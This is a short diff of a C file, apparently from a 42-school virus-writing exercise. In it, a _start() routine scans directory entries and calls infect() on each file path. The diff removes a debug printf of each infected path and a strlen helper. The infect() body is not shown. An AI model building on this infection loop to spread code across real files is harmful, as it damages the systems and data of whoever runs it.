@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
-/*   Updated: 2024/10/31 11:55:02 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/10/31 13:53:43 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -53,8 +53,6 @@ void _start() {
 					for (size_t i = 0; i < file_size; i++)
 						max_path[len_dir + 1 + i] = d->d_name[i];
 
-					printf("[%s]\n", max_path);
-
 					infect(max_path);
 				}
 
@@ -74,13 +72,3 @@ void _start() {
 	
 	exit(0);
 }
-
-size_t	ft_strlen(str buff) {
-	size_t	index = 0;
-
-	while (buff[index])
-		index++;
-
-	return index;
-}
-
